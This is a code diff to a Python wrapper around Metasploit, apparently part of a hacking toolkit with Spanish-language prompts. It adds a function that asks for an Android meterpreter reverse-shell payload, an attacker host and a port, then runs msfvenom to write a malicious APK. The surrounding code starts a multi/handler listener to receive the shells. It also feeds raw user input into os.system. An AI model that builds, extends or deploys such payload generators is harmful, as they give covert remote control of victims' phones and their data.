@@ -96,4 +96,34 @@ def generate():
         datamsf = f"use exploit/multi/handler;set PAYLOAD {PAYLOAD};set LHOST {LHOST};set LPORT {LPORT};exploit"
         subprocess.call(["sudo", "msfconsole", "-q", "-x", datamsf])
 
+def androidPayloadGenerate():
+    print("")
+    print("{}Selecione el Payload{}".format(color, Fore.LIGHTWHITE_EX))
+    print("")
+    print("[{}01{}] android/meterpreter/reverse_http".format(color, Fore.LIGHTWHITE_EX))
+    print("[{}02{}] android/meterpreter/reverse_https".format(color, Fore.LIGHTWHITE_EX))
+    print("[{}03{}] android/meterpreter/reverse_tcp".format(color, Fore.LIGHTWHITE_EX))
+    print("")
 
+    AndroidPayload = input(str(" {} ({}Metasploit/GeneratePayload{}) Payload > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))
+
+    if AndroidPayload == '1' or AndroidPayload == '01':
+        PAYLOAD = 'android/meterpreter/reverse_http'
+        
+    elif AndroidPayload == '2' or AndroidPayload == '02':
+        PAYLOAD = 'android/meterpreter/reverse_https'
+        
+    elif AndroidPayload == '3' or AndroidPayload == '03':
+        PAYLOAD = 'android/meterpreter/reverse_tcp'
+
+    else:
+        print("[!] Option Not Avalible")
+        print("")
+        androidPayloadGenerate()
+
+    LHOST = input(str(" {} ({}Metasploit/PayloadGenerate{}) LHOST > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))
+    LPORT = input(str(" {} ({}Metasploit/PayloadGenerate{}) LPORT > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))
+    NAME = input(str(" {} ({}Metasploit/PayloadGenerate{}) FileName > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))
+
+    os.system(f"sudo msfvenom -p {PAYLOAD} lhost={LHOST} lport={LPORT} -o output/{NAME}.apk")
+    print("File save in {}output/{}.apk{}".format(Fore.LIGHTGREEN_EX, NAME, Fore.LIGHTWHITE_EX))
